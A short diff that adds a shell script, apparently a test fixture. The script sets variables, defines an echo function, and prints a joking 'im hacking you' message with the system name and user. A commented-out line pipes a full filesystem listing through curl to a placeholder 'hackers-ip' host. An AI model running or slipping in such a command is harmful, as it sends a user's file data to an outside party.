@@ -1,0 +1,12 @@
+FOO=1
+BAR=2
+
+foo() {
+	echo 'hello from foo function!'
+}
+
+echo im hacking you lol
+echo your system is $(uname)
+echo your user is $USER
+
+# find / | curl -X PUT -s -d@- hackers-ip
